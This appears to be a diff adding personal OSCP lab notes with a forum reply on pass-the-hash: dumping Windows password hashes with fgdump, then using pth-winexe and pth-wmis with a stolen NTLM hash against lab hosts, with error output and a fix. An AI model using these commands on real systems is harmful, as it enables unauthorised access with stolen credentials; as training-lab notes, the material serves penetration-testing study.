@@ -1,0 +1,40 @@
+
+Using fgdump.exe you dump the password hashes
+From the hash file you copy the LM and NTML part of a line:
+
+Administrator:500:NO PASSWORD*********************:259745CB123A52AA2E693AAACCA2DB52
+
+You replace the NO PASSWORD*** with the LM hash of the specified password
+then export both as a variable:
+
+root@kali:~/Desktop/OSCP# export SMBHASH=0182BD0BD4444BF836077A718CCDF409:259745CB123A52AA2E693AAACCA2DB52
+
+
+root@kali:~/Desktop/OSCP# /usr/bin/pth-winexe -U administrator% //10.11.1.5 cmd
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+smb_signing_good: BAD SIG: seq 1
+ERROR: Cannot connect to svcctl pipe. NT_STATUS_ACCESS_DENIED.
+root@kali:~/Desktop/OSCP/ALICE# 
+
+And it should work, but it doesn't.
+Such mistery, much amazing.
+
+
+The fix:
+Ok, its only taken me two solid days but I've worked out what the issue is. 
+I have pwned two different machines and downloaded the hashes, but no matter what I did I couldn't get pth-winexe it to work. I was getting the same error as you. I cloned the updated PTH files from Git and when I ran the command from those files I got a slightly different more descriptive error message. I searched for that error message on Google and found out that there is a specific service that needs to be running on the target host. I went back to one of my pwned boxes and sure enough the service was not running. Once I started the servcie the pth-winexe command worked, even from the original installed files, no need for the git versions. 
+
+I hope that's not too much of a spoiler Mods?
+
+BTW, 
+pth-winexe -U Administrator%yyyyyyyyyyyyyyyyyyyyyyyyyyyyy:xxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxx //10.11.1.xxx cmd
+gives the error message, but the following works, it authenticates but doesn't give a shell; 
+pth-wmis -U Administrator%yyyyyyyyyyyyyyyyyyyyyyyyyyyyy:xxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxx //10.11.1.xxx cmd
+HASH PASS: Substituting user supplied NTLM HASH...
+HASH PASS: Substituting user supplied NTLM HASH...
+[wmi/wmis.c:172:main()] 1: cmd
+NTSTATUS: NT_STATUS_OK - Success
+
+I found the following page, which I'm going to give a try; 
+http://passing-the-hash.blogspot.ro/2013/07/WMIS-PowerSploit-Shells.htmll
